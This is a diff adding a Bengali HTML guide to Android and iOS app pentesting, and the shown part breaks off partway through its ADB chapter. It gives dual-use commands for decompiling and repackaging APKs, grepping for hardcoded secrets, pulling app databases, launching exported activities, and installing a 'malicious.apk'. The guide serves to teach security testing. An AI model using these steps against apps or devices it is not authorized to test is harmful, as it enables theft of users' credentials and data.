@@ -1,0 +1,1553 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mobile Hacking — Android & iOS সম্পূর্ণ বাংলা গাইড</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --primary: #0a0a0a;
+  --android: #3ddc84;
+  --ios: #007aff;
+  --accent: #ff3b30;
+  --purple: #af52de;
+  --yellow: #ffcc00;
+  --orange: #ff9500;
+  --code-bg: #0d1117;
+  --text: #1a1a2e;
+  --bg: #f0f4f8;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Hind Siliguri','Noto Sans Bengali',sans-serif; background:var(--bg); color:var(--text); font-size:14px; line-height:1.9; }
+
+.print-btn { position:fixed; top:20px; right:20px; background:var(--accent); color:white; border:none; padding:12px 24px; border-radius:8px; font-size:15px; font-family:inherit; cursor:pointer; z-index:9999; box-shadow:0 4px 15px rgba(255,59,48,0.4); }
+
+/* COVER */
+.cover { min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:60px 40px; page-break-after:always; position:relative; overflow:hidden;
+  background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 40%, #0d2137 100%); color:white; }
+.cover::before { content:''; position:absolute; inset:0;
+  background: radial-gradient(ellipse at 25% 50%, rgba(61,220,132,0.07) 0%, transparent 55%),
+              radial-gradient(ellipse at 75% 30%, rgba(0,122,255,0.07) 0%, transparent 55%); }
+.cover-icons { font-size:70px; margin-bottom:15px; position:relative; }
+.cover h1 { font-size:38px; font-weight:700; margin-bottom:5px;
+  background:linear-gradient(135deg, var(--android), var(--ios));
+  -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; }
+.cover h2 { font-size:19px; color:rgba(255,255,255,0.7); margin-bottom:20px; }
+.cover .divider { width:100px; height:3px; background:linear-gradient(90deg,var(--android),var(--ios)); margin:15px auto; border-radius:2px; }
+.cover .desc { font-size:15px; color:rgba(255,255,255,0.62); max-width:640px; line-height:2; }
+.cover .phones { display:flex; gap:20px; justify-content:center; margin-top:25px; }
+.phone-card { background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.12); border-radius:12px; padding:18px 28px; font-family:'Courier New',monospace; font-size:12.5px; text-align:left; }
+.phone-card .ph { font-size:14px; font-weight:700; margin-bottom:8px; }
+.phone-card .ph.a { color:var(--android); }
+.phone-card .ph.i { color:var(--ios); }
+.cover .badges { margin-top:22px; display:flex; flex-wrap:wrap; justify-content:center; gap:7px; }
+.cover .badge { padding:5px 14px; border-radius:20px; font-size:12px; }
+.badge-a { background:rgba(61,220,132,0.15); border:1px solid rgba(61,220,132,0.3); color:#9fffcf; }
+.badge-i { background:rgba(0,122,255,0.15); border:1px solid rgba(0,122,255,0.3); color:#a0c8ff; }
+
+/* TOC */
+.toc { background:white; padding:48px 58px; page-break-after:always; }
+.toc-hdr { font-size:27px; color:var(--primary); border-bottom:4px solid var(--android); padding-bottom:12px; margin-bottom:28px; }
+.toc-main { display:flex; justify-content:space-between; padding:9px 0; font-weight:700; font-size:15px; color:var(--primary); border-bottom:1px solid #eee; margin-top:12px; }
+.toc-main .n { font-family:'Courier New',monospace; margin-right:10px; }
+.n-a { color:var(--android); }
+.n-i { color:var(--ios); }
+.n-b { color:var(--purple); }
+.toc-sub { padding:4px 0 4px 26px; color:#666; font-size:13px; border-bottom:1px dotted #f0f0f0; }
+
+/* CHAPTERS */
+.chapter { background:white; page-break-before:always; }
+.ch-hdr { padding:36px 52px; position:relative; overflow:hidden; }
+.intro .ch-hdr    { background:linear-gradient(135deg,#0a0a0a,#1a1a2e); }
+.android .ch-hdr  { background:linear-gradient(135deg,#0a2010,#1a4020); }
+.ch3 .ch-hdr { background:linear-gradient(135deg,#001020,#002040); }
+.ch4 .ch-hdr { background:linear-gradient(135deg,#0f0a20,#1f1040); }
+.ch5 .ch-hdr { background:linear-gradient(135deg,#0a0a20,#0a0a40); }
+.ch6 .ch-hdr { background:linear-gradient(135deg,#200a00,#401500); }
+.ch7 .ch-hdr { background:linear-gradient(135deg,#001a20,#003040); }
+.ch8 .ch-hdr { background:linear-gradient(135deg,#1a0a20,#30104a); }
+.ch9 .ch-hdr { background:linear-gradient(135deg,#0a1a0a,#104010); }
+.ch10 .ch-hdr { background:linear-gradient(135deg,#200a10,#401020); }
+.ch11 .ch-hdr { background:linear-gradient(135deg,#1a1000,#3a2800); }
+.ch12 .ch-hdr { background:linear-gradient(135deg,#000a1a,#001030); }
+
+.ch-label { font-size:11px; letter-spacing:4px; text-transform:uppercase; margin-bottom:8px; }
+.la { color:var(--android); }
+.li { color:var(--ios); }
+.lb { color:var(--purple); }
+.lc { color:var(--orange); }
+.ch-title { font-size:27px; color:white; font-weight:700; }
+.ch-desc { font-size:13px; color:rgba(255,255,255,0.52); margin-top:6px; }
+.ch-body { padding:36px 52px; }
+
+h2.s { font-size:20px; color:var(--primary); margin:30px 0 13px; padding-left:15px; border-left:5px solid var(--android); }
+h2.si { border-left-color:var(--ios); }
+h2.sb { border-left-color:var(--purple); }
+h3.ss { font-size:16.5px; color:#1a1a2e; margin:20px 0 10px; padding-bottom:5px; border-bottom:2px dashed #e0e0e0; }
+h4.m { font-size:14px; color:#333; margin:14px 0 7px; font-weight:700; }
+p { margin-bottom:12px; text-align:justify; }
+
+.code { background:var(--code-bg); color:#c9d1d9; padding:17px 20px; border-radius:9px; font-family:'Courier New',monospace; font-size:12.5px; margin:14px 0; line-height:1.85; overflow-x:auto; border:1px solid #30363d; border-left:4px solid var(--android); }
+.code.ios-code { border-left-color:var(--ios); }
+.code.both { border-left-color:var(--purple); }
+.c { color:#6e7681; }
+.g { color:var(--android); }
+.b { color:#79c0ff; }
+.r { color:#ff7b72; }
+.y { color:#e3b341; }
+.p { color:#f0883e; }
+code { background:#1e2a3a; color:#79c0ff; padding:2px 7px; border-radius:4px; font-family:'Courier New',monospace; font-size:12.5px; }
+
+.box { padding:15px 19px; border-radius:9px; margin:16px 0; border-left:5px solid; }
+.bi { background:#e8f4fd; border-color:#0077b6; color:#023e8a; }
+.bw { background:#fff8e6; border-color:var(--orange); color:#7b3f00; }
+.bd { background:#fde8ea; border-color:var(--accent); color:#9b1d20; }
+.bs { background:#e8f8ed; border-color:var(--android); color:#0a4020; }
+.bp { background:#f3e8ff; border-color:var(--purple); color:#4a0072; }
+.bt { font-weight:700; margin-bottom:7px; font-size:14px; }
+
+table { width:100%; border-collapse:collapse; margin:16px 0; font-size:13px; }
+thead tr { background:var(--primary); color:white; }
+th { padding:11px 13px; text-align:left; font-weight:600; }
+td { padding:9px 13px; border-bottom:1px solid #eee; }
+tr:nth-child(even) { background:#f8f9fa; }
+
+.dg { background:#0d1117; border:1px solid #30363d; border-radius:9px; padding:18px 20px; font-family:'Courier New',monospace; font-size:12.5px; line-height:1.85; margin:16px 0; color:#c9d1d9; overflow-x:auto; }
+
+.g2 { display:grid; grid-template-columns:1fr 1fr; gap:15px; margin:15px 0; }
+.card { background:#f8f9fa; border:1px solid #e0e0e0; border-radius:9px; padding:15px; }
+.card h4 { font-size:14px; margin-bottom:8px; padding-bottom:5px; color:var(--primary); }
+.card.ac { border-color:var(--android); }
+.card.ac h4 { color:#0a4020; border-bottom:2px solid var(--android); }
+.card.ic { border-color:var(--ios); }
+.card.ic h4 { color:#003a7a; border-bottom:2px solid var(--ios); }
+.card.dc { border-color:var(--accent); }
+.card.dc h4 { color:var(--accent); border-bottom:2px solid var(--accent); }
+
+ul,ol { margin:10px 0 10px 23px; line-height:2; }
+li { margin-bottom:3px; }
+
+.tag { display:inline-block; padding:2px 9px; border-radius:11px; font-size:11.5px; font-weight:700; margin:2px; }
+.ta { background:#d1fae5; color:#065f46; }
+.ti { background:#dbeafe; color:#1e40af; }
+.td { background:#fde8ea; color:#9b1d20; }
+.tw { background:#fef3c7; color:#92400e; }
+
+.summary { background:linear-gradient(135deg,#0a0a0a,#1a1a2e); color:white; border-radius:12px; padding:22px 27px; margin-top:32px; }
+.summary h3 { color:var(--android); margin-bottom:12px; font-size:16px; }
+.summary li { color:rgba(255,255,255,0.82); margin-bottom:5px; }
+
+@media print {
+  .print-btn { display:none; }
+  body { background:white; }
+  .ch-hdr,.cover,thead tr,.code,.dg { -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+}
+</style>
+</head>
+<body>
+<button class="print-btn" onclick="window.print()">🖨️ PDF সেভ করুন</button>
+
+<!-- COVER -->
+<div class="cover">
+  <div class="cover-icons">📱</div>
+  <h1>Mobile Application Hacking</h1>
+  <h2>Android ও iOS সিকিউরিটি — সম্পূর্ণ বাংলা গাইড</h2>
+  <div class="divider"></div>
+  <p class="desc">Android APK Analysis থেকে iOS App Pentesting, Frida Hooking, Traffic Interception, Root/Jailbreak Detection Bypass — সব কিছু এক জায়গায়।</p>
+  <div class="phones">
+    <div class="phone-card">
+      <div class="ph a">🤖 Android</div>
+      <div style="color:#a0e8c0">APK Reverse Engineering</div>
+      <div style="color:#a0e8c0">ADB Exploitation</div>
+      <div style="color:#a0e8c0">Root Detection Bypass</div>
+      <div style="color:#a0e8c0">Frida Hooking</div>
+    </div>
+    <div class="phone-card">
+      <div class="ph i">🍎 iOS</div>
+      <div style="color:#a0c8ff">IPA Analysis</div>
+      <div style="color:#a0c8ff">Jailbreak Bypass</div>
+      <div style="color:#a0c8ff">Objection Framework</div>
+      <div style="color:#a0c8ff">Keychain Dumping</div>
+    </div>
+  </div>
+  <div class="badges">
+    <span class="badge badge-a">📦 APK Analysis</span>
+    <span class="badge badge-a">🔧 ADB</span>
+    <span class="badge badge-a">💉 Frida</span>
+    <span class="badge badge-a">🔓 Root Bypass</span>
+    <span class="badge badge-i">🍎 iOS Pentest</span>
+    <span class="badge badge-i">🔑 Keychain</span>
+    <span class="badge badge-i">🏗️ Objection</span>
+    <span class="badge badge-a badge-i">🌐 Traffic Intercept</span>
+    <span class="badge badge-a">🧬 Smali/Jadx</span>
+    <span class="badge badge-i">📋 plist Analysis</span>
+  </div>
+</div>
+
+<!-- TOC -->
+<div class="toc">
+  <div class="toc-hdr">📋 বিষয়সূচি</div>
+
+  <div class="toc-main"><span><span class="n n-b">01</span> Mobile Security ফান্ডামেন্টাল</span></div>
+  <div class="toc-sub">Android vs iOS Architecture, Attack Surface, OWASP Mobile Top 10</div>
+
+  <div class="toc-main"><span><span class="n n-a">02</span> Android Architecture ও Security Model</span></div>
+  <div class="toc-sub">APK Structure, Permission System, Sandbox, Intents</div>
+
+  <div class="toc-main"><span><span class="n n-a">03</span> Android Static Analysis</span></div>
+  <div class="toc-sub">APK Decompile, JADX, Androguard, Manifest Analysis, Hardcoded Secrets</div>
+
+  <div class="toc-main"><span><span class="n n-a">04</span> Android Dynamic Analysis</span></div>
+  <div class="toc-sub">ADB বিস্তারিত, Logcat, Activity Launch, Data Extraction</div>
+
+  <div class="toc-main"><span><span class="n n-a">05</span> Frida — Dynamic Instrumentation</span></div>
+  <div class="toc-sub">Frida Setup, Hooking Functions, Root/SSL Pinning Bypass</div>
+
+  <div class="toc-main"><span><span class="n n-a">06</span> Android Traffic Interception</span></div>
+  <div class="toc-sub">Burp Suite Setup, SSL Pinning Bypass, Certificate Bypass</div>
+
+  <div class="toc-main"><span><span class="n n-i">07</span> iOS Architecture ও Security Model</span></div>
+  <div class="toc-sub">iOS Sandbox, Code Signing, Secure Enclave, Entitlements</div>
+
+  <div class="toc-main"><span><span class="n n-i">08</span> iOS Static Analysis</span></div>
+  <div class="toc-sub">IPA Analysis, plist Files, Binary Analysis, Strings</div>
+
+  <div class="toc-main"><span><span class="n n-i">09</span> iOS Dynamic Analysis</span></div>
+  <div class="toc-sub">Objection Framework, Frida iOS, Keychain Dumping, Class Dump</div>
+
+  <div class="toc-main"><span><span class="n n-b">10</span> Mobile Traffic Analysis</span></div>
+  <div class="toc-sub">Burp Suite Mobile, mitmproxy, Wireshark, API Testing</div>
+
+  <div class="toc-main"><span><span class="n n-b">11</span> OWASP Mobile Top 10 — বিস্তারিত</span></div>
+  <div class="toc-sub">M1-M10 প্রতিটি দুর্বলতা Exploit সহ</div>
+
+  <div class="toc-main"><span><span class="n n-b">12</span> Tools ও Lab Setup</span></div>
+  <div class="toc-sub">MobSF, Drozer, apktool, Genymotion, Lab Environment</div>
+</div>
+
+<!-- ══════════════════════
+     CH 1: ফান্ডামেন্টাল
+══════════════════════ -->
+<div class="chapter intro">
+  <div class="ch-hdr">
+    <div class="ch-label lb">CHAPTER 01</div>
+    <div class="ch-title">📱 Mobile Security ফান্ডামেন্টাল</div>
+    <div class="ch-desc">শুরু করার আগে যা জানতেই হবে</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s sb">Mobile App কেন হ্যাক করা হয়?</h2>
+    <p>বিশ্বে ৬০%+ ইন্টারনেট ব্যবহার হয় মোবাইল থেকে। Banking, Shopping, Healthcare — সব কিছুই এখন App-এ। তাই Mobile App হলো হ্যাকারদের সবচেয়ে বড় টার্গেট।</p>
+
+    <div class="g2">
+      <div class="card ac">
+        <h4>🤖 Android Attack Surface</h4>
+        <ul>
+          <li>APK Reverse Engineering</li>
+          <li>Hardcoded Secrets</li>
+          <li>Insecure Data Storage</li>
+          <li>Weak Cryptography</li>
+          <li>Intent Hijacking</li>
+          <li>Exported Activities</li>
+          <li>Root Detection Bypass</li>
+          <li>SSL Pinning Bypass</li>
+        </ul>
+      </div>
+      <div class="card ic">
+        <h4>🍎 iOS Attack Surface</h4>
+        <ul>
+          <li>IPA Binary Analysis</li>
+          <li>Keychain Data Extraction</li>
+          <li>Insecure plist Storage</li>
+          <li>Jailbreak Detection Bypass</li>
+          <li>Method Swizzling</li>
+          <li>Weak Touch ID Implementation</li>
+          <li>URL Scheme Hijacking</li>
+          <li>Certificate Pinning Bypass</li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="s sb">Android vs iOS — Security তুলনা</h2>
+    <table>
+      <thead><tr><th>বিষয়</th><th>Android</th><th>iOS</th></tr></thead>
+      <tbody>
+        <tr><td>Source</td><td>Open Source (AOSP)</td><td>Closed Source</td></tr>
+        <tr><td>App Store</td><td>Google Play + Sideloading</td><td>App Store only (Jailbreak ছাড়া)</td></tr>
+        <tr><td>Sandbox</td><td>Linux-based</td><td>Strict Sandbox</td></tr>
+        <tr><td>Permission</td><td>Runtime Permission</td><td>Granular Permission</td></tr>
+        <tr><td>Hacking সহজ?</td><td>⭐⭐⭐⭐⭐ অনেক সহজ</td><td>⭐⭐⭐ কঠিন কিন্তু সম্ভব</td></tr>
+        <tr><td>Rooting/Jailbreak</td><td>Root সহজ</td><td>Jailbreak কঠিন</td></tr>
+        <tr><td>Testing Tool</td><td>ADB, apktool, Frida</td><td>Objection, Frida, Cycript</td></tr>
+        <tr><td>Malware বেশি?</td><td>হ্যাঁ (৯৮%+ Mobile Malware)</td><td>তুলনামূলক কম</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s sb">OWASP Mobile Top 10 — ২০২৪</h2>
+    <table>
+      <thead><tr><th>#</th><th>ভালনারেবিলিটি</th><th>উদাহরণ</th></tr></thead>
+      <tbody>
+        <tr><td>M1</td><td>Improper Credential Usage</td><td>Hardcoded password, Weak auth</td></tr>
+        <tr><td>M2</td><td>Inadequate Supply Chain Security</td><td>Malicious SDK/Library</td></tr>
+        <tr><td>M3</td><td>Insecure Authentication/Authorization</td><td>Weak session, Token reuse</td></tr>
+        <tr><td>M4</td><td>Insufficient Input/Output Validation</td><td>SQLi, XSS in WebView</td></tr>
+        <tr><td>M5</td><td>Insecure Communication</td><td>No SSL, Weak cipher</td></tr>
+        <tr><td>M6</td><td>Inadequate Privacy Controls</td><td>PII leak, Over-permission</td></tr>
+        <tr><td>M7</td><td>Insufficient Binary Protection</td><td>No obfuscation, Reversible</td></tr>
+        <tr><td>M8</td><td>Security Misconfiguration</td><td>Debug mode, Default creds</td></tr>
+        <tr><td>M9</td><td>Insecure Data Storage</td><td>Plaintext storage, Shared prefs</td></tr>
+        <tr><td>M10</td><td>Insufficient Cryptography</td><td>MD5, ECB mode, Hardcoded key</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s sb">Lab Setup — কী কী লাগবে?</h2>
+    <div class="g2">
+      <div class="card ac">
+        <h4>Android Lab</h4>
+        <ul>
+          <li>Genymotion / Android Studio Emulator</li>
+          <li>Kali Linux (বা Ubuntu)</li>
+          <li>apktool, jadx, dex2jar</li>
+          <li>Frida + frida-tools</li>
+          <li>Burp Suite Community</li>
+          <li>MobSF (Mobile Security Framework)</li>
+          <li>ADB (Android Debug Bridge)</li>
+          <li>Drozer</li>
+        </ul>
+      </div>
+      <div class="card ic">
+        <h4>iOS Lab</h4>
+        <ul>
+          <li>Mac OS (প্রয়োজনীয়) বা iPhone</li>
+          <li>Jailbroken iPhone (checkra1n/unc0ver)</li>
+          <li>Frida + Objection</li>
+          <li>Burp Suite</li>
+          <li>class-dump</li>
+          <li>Hopper Disassembler</li>
+          <li>iMazing / 3uTools</li>
+          <li>Cydia (Package Manager)</li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 2: Android Architecture
+══════════════════════ -->
+<div class="chapter android">
+  <div class="ch-hdr">
+    <div class="ch-label la">CHAPTER 02 — ANDROID</div>
+    <div class="ch-title">🤖 Android Architecture ও Security Model</div>
+    <div class="ch-desc">APK কীভাবে কাজ করে, Permission, Sandbox বুঝতে হবে</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">Android Architecture</h2>
+    <div class="dg">
+<pre><span class="g">Android Architecture Stack:</span>
+
+┌─────────────────────────────────────────┐
+│         Applications Layer              │
+│  [Gmail] [Chrome] [Banking App] [Games] │ ← APK ফাইল
+├─────────────────────────────────────────┤
+│      Application Framework              │
+│  Activity Manager | Package Manager     │
+│  Content Providers | Notification Mgr   │
+├─────────────────────────────────────────┤
+│    Android Runtime (ART) + Libraries    │
+│  SQLite | WebKit | OpenGL | Media       │
+├─────────────────────────────────────────┤
+│         Linux Kernel                    │
+│  [Drivers] [Memory] [Process] [Network] │
+└─────────────────────────────────────────┘
+
+<span class="y">Security Layer প্রতিটি স্তরে:</span>
+App Sandbox → SELinux → Permission → Encryption
+</pre>
+    </div>
+
+    <h2 class="s">APK Structure — ভেতরে কী আছে?</h2>
+    <div class="code">
+<span class="c"># APK আসলে একটি ZIP ফাইল!</span>
+unzip app.apk -d app_extracted/
+ls app_extracted/
+
+<span class="g">app.apk/</span>
+├── <span class="y">AndroidManifest.xml</span>  ← ⭐ সবচেয়ে গুরুত্বপূর্ণ! Permissions, Activities
+├── <span class="y">classes.dex</span>          ← Compiled Java/Kotlin code (DEX format)
+├── <span class="y">classes2.dex</span>         ← আরও code (বড় app-এ)
+├── <span class="y">resources.arsc</span>        ← Compiled resources
+├── <span class="y">lib/</span>                  ← Native libraries (.so files)
+│   ├── arm64-v8a/
+│   ├── armeabi-v7a/
+│   └── x86/
+├── <span class="y">assets/</span>               ← ⭐ Raw files, databases, configs
+├── <span class="y">res/</span>                  ← UI resources, layouts, strings
+│   ├── layout/           ← XML layouts
+│   ├── values/           ← strings.xml (hardcoded values!)
+│   └── drawable/         ← Images
+└── <span class="y">META-INF/</span>             ← APK Signature
+    ├── CERT.RSA          ← Certificate
+    └── MANIFEST.MF       ← File hashes
+    </div>
+
+    <h2 class="s">AndroidManifest.xml — সবচেয়ে গুরুত্বপূর্ণ ফাইল</h2>
+    <div class="code">
+<span class="c">&lt;!-- AndroidManifest.xml উদাহরণ --&gt;</span>
+&lt;manifest package="com.example.bankapp"&gt;
+
+  <span class="c">&lt;!-- ⭐ Permissions — কী অ্যাক্সেস চাইছে? --&gt;</span>
+  &lt;uses-permission android:name="android.permission.INTERNET"/&gt;
+  &lt;uses-permission android:name="android.permission.READ_CONTACTS"/&gt;
+  &lt;uses-permission android:name="android.permission.CAMERA"/&gt;
+  &lt;uses-permission android:name="android.permission.READ_SMS"/&gt; <span class="r">&lt;!-- ⚠️ --&gt;</span>
+
+  &lt;application
+    android:debuggable="true"   <span class="r">&lt;!-- ⭐ Debug mode! বিপজ্জনক --&gt;</span>
+    android:allowBackup="true"  <span class="r">&lt;!-- ⭐ ADB দিয়ে backup সম্ভব --&gt;</span>
+    android:networkSecurityConfig="@xml/network_security_config"&gt;
+
+    <span class="c">&lt;!-- Activities --&gt;</span>
+    &lt;activity android:name=".MainActivity" android:exported="true"&gt;
+      &lt;intent-filter&gt;
+        &lt;action android:name="android.intent.action.MAIN"/&gt;
+      &lt;/intent-filter&gt;
+    &lt;/activity&gt;
+
+    <span class="c">&lt;!-- ⭐ Exported Activity — যেকেউ call করতে পারবে! --&gt;</span>
+    &lt;activity android:name=".AdminActivity"
+              android:exported="true"/&gt;  <span class="r">&lt;!-- ← বিপজ্জনক! --&gt;</span>
+
+    <span class="c">&lt;!-- Content Provider --&gt;</span>
+    &lt;provider android:name=".UserProvider"
+              android:exported="true"   <span class="r">&lt;!-- ← data leak সম্ভব --&gt;</span>
+              android:authorities="com.example.provider"/&gt;
+  &lt;/application&gt;
+&lt;/manifest&gt;
+    </div>
+
+    <h2 class="s">Android Components — Attack Vector</h2>
+    <table>
+      <thead><tr><th>Component</th><th>কাজ</th><th>Attack সম্ভাবনা</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Activity</strong></td><td>একটি Screen/UI</td><td>exported=true হলে unauthorized launch</td></tr>
+        <tr><td><strong>Service</strong></td><td>Background task</td><td>exported service abuse</td></tr>
+        <tr><td><strong>Broadcast Receiver</strong></td><td>System event শোনা</td><td>Intent injection, data interception</td></tr>
+        <tr><td><strong>Content Provider</strong></td><td>Data share করা</td><td>SQL injection, data theft</td></tr>
+        <tr><td><strong>Intent</strong></td><td>Component-এর মধ্যে যোগাযোগ</td><td>Intent Hijacking, Sniffing</td></tr>
+        <tr><td><strong>WebView</strong></td><td>Web content দেখানো</td><td>XSS, JavaScript Bridge abuse</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s">Android Permission — কীভাবে ব্যবহার করবে?</h2>
+    <div class="code">
+<span class="c"># Dangerous Permissions — মানুষের Privacy-তে হস্তক্ষেপ করে</span>
+android.permission.READ_CONTACTS      <span class="c"># সব Contact</span>
+android.permission.READ_SMS           <span class="c"># SMS পড়া — OTP চুরি সম্ভব!</span>
+android.permission.ACCESS_FINE_LOCATION <span class="c"># GPS location</span>
+android.permission.CAMERA             <span class="c"># Camera access</span>
+android.permission.RECORD_AUDIO       <span class="c"># Microphone</span>
+android.permission.READ_CALL_LOG      <span class="c"># Call history</span>
+android.permission.SEND_SMS          <span class="c"># SMS পাঠানো</span>
+
+<span class="c"># ADB দিয়ে Permission দেখা</span>
+adb shell pm list permissions -d -g   <span class="c"># Dangerous permissions</span>
+adb shell dumpsys package com.target.app | grep permission
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 3: Android Static Analysis
+══════════════════════ -->
+<div class="chapter ch3">
+  <div class="ch-hdr">
+    <div class="ch-label la">CHAPTER 03 — ANDROID</div>
+    <div class="ch-title">🔬 Android Static Analysis</div>
+    <div class="ch-desc">APK Decompile করে Source Code বিশ্লেষণ</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">APK Download করা</h2>
+    <div class="code">
+<span class="c"># Play Store থেকে APK download করার উপায়:</span>
+<span class="c"># ১. APKPure.com — third party</span>
+<span class="c"># ২. APKMirror.com — trusted</span>
+<span class="c"># ৩. Device থেকে pull করা:</span>
+adb shell pm list packages | grep target   <span class="c"># Package name খোঁজো</span>
+adb shell pm path com.target.app           <span class="c"># APK path</span>
+<span class="g">package:/data/app/com.target.app-1.apk</span>
+adb pull /data/app/com.target.app-1.apk   <span class="c"># Pull করো</span>
+
+<span class="c"># Google Play থেকে:</span>
+<span class="c"># Browser extension: APK Downloader</span>
+    </div>
+
+    <h2 class="s">apktool — APK Decompile</h2>
+    <div class="code">
+<span class="c"># Install</span>
+apt install apktool
+
+<span class="c"># APK Decompile</span>
+apktool d app.apk -o app_decoded/
+<span class="c"># Output:</span>
+<span class="g">app_decoded/
+├── AndroidManifest.xml  ← Human readable!
+├── smali/               ← Smali code (Assembly-like)
+├── res/                 ← Resources
+└── assets/              ← Raw files</span>
+
+<span class="c"># Smali থেকে APK তৈরি (Repackaging)</span>
+apktool b app_decoded/ -o modified_app.apk
+
+<span class="c"># APK Sign করা (install করতে লাগবে)</span>
+keytool -genkey -v -keystore my.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my.keystore modified_app.apk mykey
+    </div>
+
+    <h2 class="s">JADX — Java Code Decompile</h2>
+    <div class="code">
+<span class="c"># Install JADX</span>
+apt install jadx
+<span class="c"># অথবা GitHub থেকে download</span>
+
+<span class="c"># CLI দিয়ে</span>
+jadx app.apk -d output_dir/
+<span class="c"># Java source code পাবে!</span>
+
+<span class="c"># GUI দিয়ে (সবচেয়ে সহজ)</span>
+jadx-gui app.apk
+
+<span class="c"># ⭐ দরকারী JADX Tips:</span>
+<span class="c"># Ctrl+F → Code search</span>
+<span class="c"># "password" খোঁজো</span>
+<span class="c"># "secret" খোঁজো</span>
+<span class="c"># "api_key" খোঁজো</span>
+<span class="c"># "Bearer" খোঁজো (API Token)</span>
+<span class="c"># "http://" খোঁজো (Hardcoded URL)</span>
+    </div>
+
+    <h2 class="s">Hardcoded Secrets খোঁজা</h2>
+    <div class="code">
+<span class="c"># APK decompile করার পর:</span>
+grep -r "password" output_dir/ --include="*.java"
+grep -r "secret" output_dir/ --include="*.java"
+grep -r "api_key\|apikey\|API_KEY" output_dir/ -i
+grep -r "aws_secret\|aws_access" output_dir/ -i
+grep -r "private_key\|privatekey" output_dir/ -i
+grep -r "Bearer\|token" output_dir/ -i
+
+<span class="c"># strings.xml থেকে</span>
+cat output_dir/res/values/strings.xml | grep -i "key\|secret\|pass\|token"
+
+<span class="c"># assets ফাইল</span>
+find output_dir/assets/ -type f -exec file {} \;
+cat output_dir/assets/config.json 2>/dev/null
+cat output_dir/assets/app.properties 2>/dev/null
+
+<span class="c"># Network Security Config</span>
+cat output_dir/res/xml/network_security_config.xml
+<span class="c"># cleartext traffic allowed? → HTTP ব্যবহার করছে!</span>
+
+<span class="c"># Firebase URL খোঁজা</span>
+grep -r "firebaseio.com" output_dir/
+<span class="c"># Firebase publicly accessible কিনা:</span>
+curl "https://project-id.firebaseio.com/.json"
+    </div>
+
+    <h2 class="s">MobSF — Automated Static Analysis</h2>
+    <div class="code">
+<span class="c"># MobSF Install (Docker দিয়ে সহজ)</span>
+docker pull opensecurity/mobile-security-framework-mobsf
+docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
+
+<span class="c"># Browser-এ: http://localhost:8000</span>
+<span class="c"># APK Upload করো → সব analyze হবে automatically</span>
+
+<span class="c"># MobSF যা যা করে:</span>
+<span class="c"># ✅ Manifest analysis</span>
+<span class="c"># ✅ Permission analysis</span>
+<span class="c"># ✅ Hardcoded secrets</span>
+<span class="c"># ✅ Security score</span>
+<span class="c"># ✅ API endpoint</span>
+<span class="c"># ✅ Vulnerability report</span>
+    </div>
+
+    <h2 class="s">Interesting Files in APK</h2>
+    <div class="code">
+<span class="c"># SQLite Database</span>
+find output_dir/ -name "*.db" -o -name "*.sqlite"
+sqlite3 found_database.db
+.tables              <span class="c"># সব table</span>
+SELECT * FROM users; <span class="c"># User data!</span>
+
+<span class="c"># SharedPreferences XML (প্রায়ই sensitive data)</span>
+find output_dir/ -name "*.xml" -path "*/shared_prefs/*"
+cat *.xml | grep -i "token\|session\|pass"
+
+<span class="c"># Native Library Analysis</span>
+find output_dir/lib/ -name "*.so"
+strings libapp.so | grep -i "password\|secret\|key"
+nm -D libapp.so           <span class="c"># Exported symbols</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 4: Android Dynamic Analysis
+══════════════════════ -->
+<div class="chapter ch4">
+  <div class="ch-hdr">
+    <div class="ch-label la">CHAPTER 04 — ANDROID</div>
+    <div class="ch-title">⚡ Android Dynamic Analysis — ADB বিস্তারিত</div>
+    <div class="ch-desc">চলমান App-এ attack করো</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">ADB (Android Debug Bridge) — সম্পূর্ণ গাইড</h2>
+    <div class="code">
+<span class="c"># ADB সংযোগ</span>
+adb devices              <span class="c"># সংযুক্ত device দেখো</span>
+adb connect 192.168.1.5  <span class="c"># Network-এ connect</span>
+adb shell                <span class="c"># Device-এর shell খোলো</span>
+
+<span class="c"># ⭐ App Information</span>
+adb shell pm list packages          <span class="c"># সব installed app</span>
+adb shell pm list packages -3       <span class="c"># Third-party app শুধু</span>
+adb shell pm list packages | grep bank  <span class="c"># Banking app</span>
+adb shell dumpsys package com.target.app  <span class="c"># App বিস্তারিত</span>
+
+<span class="c"># ⭐ Activity Launch (Exported Activity bypass)</span>
+adb shell am start -n com.target.app/.AdminActivity
+adb shell am start -n com.target.app/.MainActivity
+adb shell am start -a android.intent.action.VIEW -d "bankapp://payment?amount=0"
+
+<span class="c"># ⭐ File System Access</span>
+adb shell ls /data/data/com.target.app/     <span class="c"># App data</span>
+adb shell ls /data/data/com.target.app/shared_prefs/
+adb shell ls /data/data/com.target.app/databases/
+adb shell ls /data/data/com.target.app/files/
+
+<span class="c"># File Pull/Push</span>
+adb pull /data/data/com.target.app/databases/user.db ./
+adb push malicious.apk /sdcard/
+adb shell pm install /sdcard/malicious.apk
+
